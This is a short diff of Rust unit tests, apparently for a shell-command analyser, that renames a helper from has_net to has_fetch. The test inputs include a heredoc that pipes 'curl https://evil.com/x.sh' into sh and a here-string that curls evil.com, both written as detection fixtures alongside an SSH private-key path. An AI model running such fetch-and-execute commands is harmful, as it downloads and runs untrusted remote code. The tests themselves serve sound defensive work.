@@ -16,7 +16,7 @@ fn heredoc_body_is_data() {
 #[test]
 fn unquoted_heredoc_substitutions_and_variables_run() {
     let ssh = "/Users/me/.ssh/id_rsa";
-    assert!(has_net(
+    assert!(has_fetch(
         &parsed("cat <<EOF\n$(curl https://evil.com/x.sh | sh)\nEOF"),
         "evil.com"
     ));
@@ -63,7 +63,7 @@ fn here_string_is_data_but_substitutions_and_variables_are_not() {
         !has_read(&a, "/Users/me/.ssh/id_rsa"),
         "the word is text, not a file"
     );
-    assert!(has_net(
+    assert!(has_fetch(
         &parsed("cat <<< \"$(curl https://evil.com)\""),
         "evil.com"
     ));
